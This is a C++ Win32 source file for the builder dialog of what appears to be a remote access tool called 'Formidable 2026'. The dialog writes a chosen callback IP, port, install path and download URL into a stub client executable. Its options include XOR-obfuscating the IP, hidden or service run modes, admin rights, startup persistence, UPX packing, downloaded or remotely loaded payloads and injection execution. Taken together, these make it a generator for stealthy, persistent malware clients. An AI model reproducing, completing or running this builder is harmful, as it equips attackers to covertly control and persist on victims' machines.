//================================================================================
// Builder Dialog - Formidable 2026
// 文件: BuilderDialog.cpp
// 说明: 客户端生成器对话框实现
// 编码: UTF-8 BOM
//================================================================================

#include "BuilderDialog.h"
#include "../GlobalState.h"
#include "../StringUtils.h"
#include "../NetworkHelper.h"
#include "../resource.h"
#include "../../Common/Config.h"
#include "../Utils/StringHelper.h"
#include <CommDlg.h>
#include <string>
#include <vector>

INT_PTR CALLBACK BuilderDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam) {
    switch (message) {
    case WM_INITDIALOG: {
        // 设置对话框图标
        SendMessageW(hDlg, WM_SETICON, ICON_SMALL, (LPARAM)LoadIconW(g_hInstance, MAKEINTRESOURCEW(IDI_BUILDER)));
        SendMessageW(hDlg, WM_SETICON, ICON_BIG, (LPARAM)LoadIconW(g_hInstance, MAKEINTRESOURCEW(IDI_BUILDER)));
        
        // EXE类型 Combobox
        HWND hComboExeType = GetDlgItem(hDlg, IDC_COMBO_EXE_TYPE);
        if (hComboExeType) {
            SendMessageW(hComboExeType, CB_ADDSTRING, 0, (LPARAM)L"EXE (控制台)");
            SendMessageW(hComboExeType, CB_SETCURSEL, 0, 0);
        }
        
        // 位数 Combobox
        HWND hComboBits = GetDlgItem(hDlg, IDC_COMBO_BITS);
        if (hComboBits) {
            SendMessageW(hComboBits, CB_ADDSTRING, 0, (LPARAM)L"x86");
            SendMessageW(hComboBits, CB_ADDSTRING, 0, (LPARAM)L"x64");
            SendMessageW(hComboBits, CB_ADDSTRING, 0, (LPARAM)L"Both");
            SendMessageW(hComboBits, CB_SETCURSEL, 1, 0); // 管理x64
        }
        
        // 运行类型 Combobox
        HWND hComboRunType = GetDlgItem(hDlg, IDC_COMBO_RUN_TYPE);
        if (hComboRunType) {
            SendMessageW(hComboRunType, CB_ADDSTRING, 0, (LPARAM)L"正常运行");
            SendMessageW(hComboRunType, CB_ADDSTRING, 0, (LPARAM)L"隐藏运行");
            SendMessageW(hComboRunType, CB_ADDSTRING, 0, (LPARAM)L"服务运行");
            SendMessageW(hComboRunType, CB_SETCURSEL, 0, 0);
        }
        
        // 协议 Combobox
        HWND hComboProtocol = GetDlgItem(hDlg, IDC_COMBO_PROTOCOL);
        if (hComboProtocol) {
            SendMessageW(hComboProtocol, CB_ADDSTRING, 0, (LPARAM)L"TCP");
            SendMessageW(hComboProtocol, CB_ADDSTRING, 0, (LPARAM)L"UDP");
            SendMessageW(hComboProtocol, CB_SETCURSEL, 0, 0);
        }
        
        // 加密类型 Combobox
        HWND hComboEncrypt = GetDlgItem(hDlg, IDC_COMBO_ENCRYPT);
        if (hComboEncrypt) {
            SendMessageW(hComboEncrypt, CB_ADDSTRING, 0, (LPARAM)L"无加密");
            SendMessageW(hComboEncrypt, CB_ADDSTRING, 0, (LPARAM)L"XOR");
            SendMessageW(hComboEncrypt, CB_ADDSTRING, 0, (LPARAM)L"AES");
            SendMessageW(hComboEncrypt, CB_SETCURSEL, 0, 0);
        }
        
        // 压缩类型 Combobox
        HWND hComboCompress = GetDlgItem(hDlg, IDC_COMBO_COMPRESS);
        if (hComboCompress) {
            SendMessageW(hComboCompress, CB_ADDSTRING, 0, (LPARAM)L"不压缩");
            SendMessageW(hComboCompress, CB_ADDSTRING, 0, (LPARAM)L"UPX");
            SendMessageW(hComboCompress, CB_ADDSTRING, 0, (LPARAM)L"MPRESS");
            SendMessageW(hComboCompress, CB_SETCURSEL, 0, 0);
        }
        
        // 负载类型 Combobox
        HWND hComboPayload = GetDlgItem(hDlg, IDC_COMBO_PAYLOAD);
        if (hComboPayload) {
            SendMessageW(hComboPayload, CB_ADDSTRING, 0, (LPARAM)L"内嵌");
            SendMessageW(hComboPayload, CB_ADDSTRING, 0, (LPARAM)L"下载");
            SendMessageW(hComboPayload, CB_ADDSTRING, 0, (LPARAM)L"远程加载");
            SendMessageW(hComboPayload, CB_SETCURSEL, 0, 0);
        }
        
        // 执行模式 Combobox
        HWND hComboExecModel = GetDlgItem(hDlg, IDC_COMBO_EXECMODEL);
        if (hComboExecModel) {
            SendMessageW(hComboExecModel, CB_ADDSTRING, 0, (LPARAM)L"直接执行");
            SendMessageW(hComboExecModel, CB_ADDSTRING, 0, (LPARAM)L"注入执行");
            SendMessageW(hComboExecModel, CB_SETCURSEL, 0, 0);
        }
        
        // 设置默认值
        SetDlgItemTextW(hDlg, IDC_EDIT_IP, L"127.0.0.1");
        SetDlgItemTextW(hDlg, IDC_EDIT_PORT, std::to_wstring(Formidable::DEFAULT_PORT).c_str());
        SetDlgItemTextW(hDlg, IDC_EDIT_GROUP, L"Default");
        
        // 默认选项
        CheckDlgButton(hDlg, IDC_CHECK_ADMIN, BST_CHECKED);
        CheckDlgButton(hDlg, IDC_CHECK_STARTUP, BST_CHECKED);
        CheckDlgButton(hDlg, IDC_CHECK_ENCRYPT_IP, BST_CHECKED);

        // 设置安装目录和程序名称默认值
        SetDlgItemTextW(hDlg, IDC_EDIT_INSTALL_DIR, L"%AppData%\\Formidable");
        SetDlgItemTextW(hDlg, IDC_EDIT_INSTALL_NAME, L"Client.exe");
        
        return (INT_PTR)TRUE;
    }
    case WM_COMMAND:
        if (LOWORD(wParam) == IDC_COMBO_PAYLOAD) {
            if (HIWORD(wParam) == CBN_SELCHANGE) {
                HWND hCombo = (HWND)lParam;
                int index = (int)SendMessageW(hCombo, CB_GETCURSEL, 0, 0);
                // 只有选择"下载"或"远程加载"时才启用下载地址输入
                EnableWindow(GetDlgItem(hDlg, IDC_EDIT_DOWNLOAD_URL), index == 1 || index == 2);
            }
            return (INT_PTR)TRUE;
        }
        if (LOWORD(wParam) == IDC_CHECK_BOTH) {
            BOOL isBoth = IsDlgButtonChecked(hDlg, IDC_CHECK_BOTH);
            EnableWindow(GetDlgItem(hDlg, IDC_RADIO_X86), !isBoth);
            EnableWindow(GetDlgItem(hDlg, IDC_RADIO_X64), !isBoth);
            return (INT_PTR)TRUE;
        }
        if (LOWORD(wParam) == IDCANCEL) {
            EndDialog(hDlg, LOWORD(wParam));
            return (INT_PTR)TRUE;
        }
        if (LOWORD(wParam) == IDC_BTN_BUILD) {
            wchar_t wIP[100], wPort[8], wGroup[24], wInstallDir[MAX_PATH], wInstallName[MAX_PATH], wDownloadUrl[512];
            GetDlgItemTextW(hDlg, IDC_EDIT_IP, wIP, 100);
            GetDlgItemTextW(hDlg, IDC_EDIT_PORT, wPort, 8);
            GetDlgItemTextW(hDlg, IDC_EDIT_GROUP, wGroup, 24);
            GetDlgItemTextW(hDlg, IDC_EDIT_INSTALL_DIR, wInstallDir, MAX_PATH);
            GetDlgItemTextW(hDlg, IDC_EDIT_INSTALL_NAME, wInstallName, MAX_PATH);
            GetDlgItemTextW(hDlg, IDC_EDIT_DOWNLOAD_URL, wDownloadUrl, 512);

            if (wcslen(wIP) == 0 || wcslen(wPort) == 0) {
                MessageBoxW(hDlg, L"IP和端口不能为空", L"提示", MB_OK | MB_ICONWARNING);
                return (INT_PTR)TRUE;
            }

            std::string ip = Formidable::Utils::StringHelper::WideToUTF8(wIP);
            std::string port = Formidable::Utils::StringHelper::WideToUTF8(wPort);
            std::string group = Formidable::Utils::StringHelper::WideToUTF8(wGroup);
            std::string installDir = Formidable::Utils::StringHelper::WideToUTF8(wInstallDir);
            std::string installName = Formidable::Utils::StringHelper::WideToUTF8(wInstallName);
            std::string downloadUrl = Formidable::Utils::StringHelper::WideToUTF8(wDownloadUrl);
            
            int runTypeIndex = (int)SendMessageW(GetDlgItem(hDlg, IDC_COMBO_RUN_TYPE), CB_GETCURSEL, 0, 0);
            int protocolIndex = (int)SendMessageW(GetDlgItem(hDlg, IDC_COMBO_PROTOCOL), CB_GETCURSEL, 0, 0);
            int compressIndex = (int)SendMessageW(GetDlgItem(hDlg, IDC_COMBO_COMPRESS), CB_GETCURSEL, 0, 0);
            int payloadIndex = (int)SendMessageW(GetDlgItem(hDlg, IDC_COMBO_PAYLOAD), CB_GETCURSEL, 0, 0);
            
            bool runAsAdmin = (IsDlgButtonChecked(hDlg, IDC_CHECK_ADMIN) == BST_CHECKED);
            bool startup = (IsDlgButtonChecked(hDlg, IDC_CHECK_STARTUP) == BST_CHECKED);
            bool buildBoth = (IsDlgButtonChecked(hDlg, IDC_CHECK_BOTH) == BST_CHECKED);
            bool is64Bit = (IsDlgButtonChecked(hDlg, IDC_RADIO_X64) == BST_CHECKED); // 检查单选框状态
            bool encryptIp = (IsDlgButtonChecked(hDlg, IDC_CHECK_ENCRYPT_IP) == BST_CHECKED);

            // 如果选择了 Both，则忽略 is64Bit 手动选择的结果，直接循环两次
            if (buildBoth) {
                // ... logic for both handled by BuildOne callers
            }

            // 从内存加载模块
            wchar_t szSavePath[MAX_PATH] = L"Formidable_Client.exe";
            OPENFILENAMEW ofn = { 0 };
            ofn.lStructSize = sizeof(ofn);
            ofn.hwndOwner = hDlg;
            ofn.lpstrFilter = L"可执行文件 (*.exe)\0*.exe\0所有文件 (*.*)\0*.*\0";
            ofn.lpstrFile = szSavePath;
            ofn.nMaxFile = MAX_PATH;
            ofn.Flags = OFN_OVERWRITEPROMPT | OFN_PATHMUSTEXIST;
            ofn.lpstrDefExt = L"exe";
            ofn.lpstrTitle = L"保存客户端";

            if (!GetSaveFileNameW(&ofn)) return (INT_PTR)TRUE;

            std::wstring baseSavePath = szSavePath;
            
            auto BuildOne = [&](bool x64, const std::wstring& dest) -> bool {
                std::vector<char> buffer;
                int resId = x64 ? IDR_CLIENT_EXE_X64 : IDR_CLIENT_EXE_X86;
                if (!GetResourceData(resId, buffer)) {
                    // 如果资源不存在，尝试从本地文件加载
                    wchar_t szExePath[MAX_PATH];
                    GetModuleFileNameW(NULL, szExePath, MAX_PATH);
                    std::wstring currentDir = szExePath;
                    currentDir = currentDir.substr(0, currentDir.find_last_of(L"\\/"));
                    
                    std::wstring clientPath = currentDir + (x64 ? L"\\Client_x64.exe" : L"\\Client_x86.exe");
                    // 尝试在上一级目录找
                    if (GetFileAttributesW(clientPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
                        clientPath = currentDir + (x64 ? L"\\..\\Client_x64.exe" : L"\\..\\Client_x86.exe");
                    }
                    
                    HANDLE hFile = CreateFileW(clientPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
                    if (hFile != INVALID_HANDLE_VALUE) {
                        DWORD size = GetFileSize(hFile, NULL);
                        buffer.resize(size);
                        DWORD read;
                        ReadFile(hFile, buffer.data(), size, &read, NULL);
                        CloseHandle(hFile);
                    } else {
                        return false;
                    }
                }

                bool found = false;
                DWORD dwSize = (DWORD)buffer.size();
                // 搜索特征码 "FRMD26_CONFIG"
                const char* flag = "FRMD26_CONFIG";
                size_t flagLen = strlen(flag);
                
                for (size_t i = 0; i < dwSize - sizeof(Formidable::CONNECT_ADDRESS); i++) {
                    if (memcmp(buffer.data() + i, flag, flagLen) == 0) {
                        Formidable::CONNECT_ADDRESS* pAddr = (Formidable::CONNECT_ADDRESS*)(buffer.data() + i);
                        
                        // 彻底清空结构体（除了标识符）
                        memset(pAddr->szServerIP, 0, sizeof(pAddr->szServerIP));
                        memset(pAddr->szPort, 0, sizeof(pAddr->szPort));
                        memset(pAddr->szGroupName, 0, sizeof(pAddr->szGroupName));
                        memset(pAddr->szInstallDir, 0, sizeof(pAddr->szInstallDir));
                        memset(pAddr->szInstallName, 0, sizeof(pAddr->szInstallName));
                        memset(pAddr->szDownloadUrl, 0, sizeof(pAddr->szDownloadUrl));
                        
                        // 填入配置
                        std::string finalIp = ip;
                        if (encryptIp) {
                            for (size_t k = 0; k < finalIp.length(); k++) {
                                finalIp[k] ^= 0x5A; // 简单的异或加密
                            }
                        }

                        strncpy_s(pAddr->szServerIP, sizeof(pAddr->szServerIP), finalIp.c_str(), _TRUNCATE);
                        strncpy_s(pAddr->szPort, sizeof(pAddr->szPort), port.c_str(), _TRUNCATE);
                        strncpy_s(pAddr->szGroupName, sizeof(pAddr->szGroupName), group.c_str(), _TRUNCATE);
                        strncpy_s(pAddr->szInstallDir, sizeof(pAddr->szInstallDir), installDir.c_str(), _TRUNCATE);
                        strncpy_s(pAddr->szInstallName, sizeof(pAddr->szInstallName), installName.c_str(), _TRUNCATE);
                        strncpy_s(pAddr->szDownloadUrl, sizeof(pAddr->szDownloadUrl), downloadUrl.c_str(), _TRUNCATE);
                        
                        pAddr->bEncrypt = encryptIp ? 1 : 0;
                        pAddr->runasAdmin = (char)(runAsAdmin ? 1 : 0);
                        pAddr->iStartup = startup ? 1 : 0;
                        pAddr->runningType = (char)runTypeIndex;
                        pAddr->protoType = (char)protocolIndex;
                        pAddr->payloadType = (char)payloadIndex;
                        
                        found = true;
                        // 不 break，继续搜索以防有多个备份（虽然通常只有一个）
                    }
                }
                if (!found) return false;

                // 写入临时文件或目标文件
                if (compressIndex == 1) { // UPX
                    wchar_t szTempPath[MAX_PATH], szTempFile[MAX_PATH];
                    GetTempPathW(MAX_PATH, szTempPath);
                    GetTempFileNameW(szTempPath, L"FRM", 0, szTempFile);
                    
                    HANDLE hFile = CreateFileW(szTempFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                    if (hFile != INVALID_HANDLE_VALUE) {
                        DWORD written;
                        WriteFile(hFile, buffer.data(), dwSize, &written, NULL);
                        CloseHandle(hFile);
                        
                        // 获取当前程序目录
                        wchar_t szModulePath[MAX_PATH];
                        GetModuleFileNameW(NULL, szModulePath, MAX_PATH);
                        std::wstring baseDir = szModulePath;
                        baseDir = baseDir.substr(0, baseDir.find_last_of(L"\\/"));
                        
                        // 尝试在多个可能的位置寻找 UPX
                        std::vector<std::wstring> upxPaths;
                        if (x64) {
                            upxPaths.push_back(baseDir + L"\\upx64.exe");
                            upxPaths.push_back(baseDir + L"\\thirdparty\\Bin\\upx64.exe");
                            upxPaths.push_back(baseDir + L"\\..\\thirdparty\\Bin\\upx64.exe");
                            upxPaths.push_back(baseDir + L"\\..\\..\\thirdparty\\Bin\\upx64.exe");
                        } else {
                            upxPaths.push_back(baseDir + L"\\upx32.exe");
                            upxPaths.push_back(baseDir + L"\\thirdparty\\Bin\\upx32.exe");
                            upxPaths.push_back(baseDir + L"\\..\\thirdparty\\Bin\\upx32.exe");
                            upxPaths.push_back(baseDir + L"\\..\\..\\thirdparty\\Bin\\upx32.exe");
                        }
                        upxPaths.push_back(baseDir + L"\\upx.exe");
                        upxPaths.push_back(baseDir + L"\\thirdparty\\Bin\\upx.exe");
                        upxPaths.push_back(baseDir + L"\\..\\thirdparty\\Bin\\upx.exe");
                        upxPaths.push_back(baseDir + L"\\..\\..\\thirdparty\\Bin\\upx.exe");

                        std::wstring upxExe;
                        for (const auto& path : upxPaths) {
                            if (GetFileAttributesW(path.c_str()) != INVALID_FILE_ATTRIBUTES) {
                                upxExe = path;
                                break;
                            }
                        }

                        if (!upxExe.empty()) {
                            std::wstring cmd = L"\"" + upxExe + L"\" -9 \"" + szTempFile + L"\" -o \"" + dest + L"\"";
                            
                            STARTUPINFOW si = { sizeof(si) };
                            PROCESS_INFORMATION pi = { 0 };
                            si.dwFlags = STARTF_USESHOWWINDOW;
                            si.wShowWindow = SW_HIDE;
                            
                            if (CreateProcessW(NULL, (LPWSTR)cmd.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
                                WaitForSingleObject(pi.hProcess, 30000); // 压缩可能需要一点时间
                                CloseHandle(pi.hProcess);
                                CloseHandle(pi.hThread);
                                DeleteFileW(szTempFile);
                                return true;
                            }
                        }
                        DeleteFileW(szTempFile);
                    }
                }

                HANDLE hFile = CreateFileW(dest.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                if (hFile != INVALID_HANDLE_VALUE) {
                    DWORD written;
                    WriteFile(hFile, buffer.data(), (DWORD)buffer.size(), &written, NULL);
                    CloseHandle(hFile);
                    return true;
                }
                return false;
            };

            bool success = false;
            if (buildBoth) {
                std::wstring pathX86 = baseSavePath;
                size_t dotPos = pathX86.find_last_of(L'.');
                if (dotPos != std::wstring::npos) {
                    pathX86.insert(dotPos, L"_x86");
                } else {
                    pathX86 += L"_x86";
                }
                
                std::wstring pathX64 = baseSavePath;
                if (dotPos != std::wstring::npos) {
                    pathX64.insert(dotPos, L"_x64");
                } else {
                    pathX64 += L"_x64";
                }
                
                success = BuildOne(false, pathX86) && BuildOne(true, pathX64);
            } else {
                success = BuildOne(is64Bit, baseSavePath);
            }

            if (success) {
                MessageBoxW(hDlg, L"生成成功", L"提示", MB_OK | MB_ICONINFORMATION);
            } else {
                MessageBoxW(hDlg, L"生成失败，请检查资源文件或UPX路径", L"错误", MB_OK | MB_ICONERROR);
            }
            return (INT_PTR)TRUE;
        }
        break;
    }
    return (INT_PTR)FALSE;
}
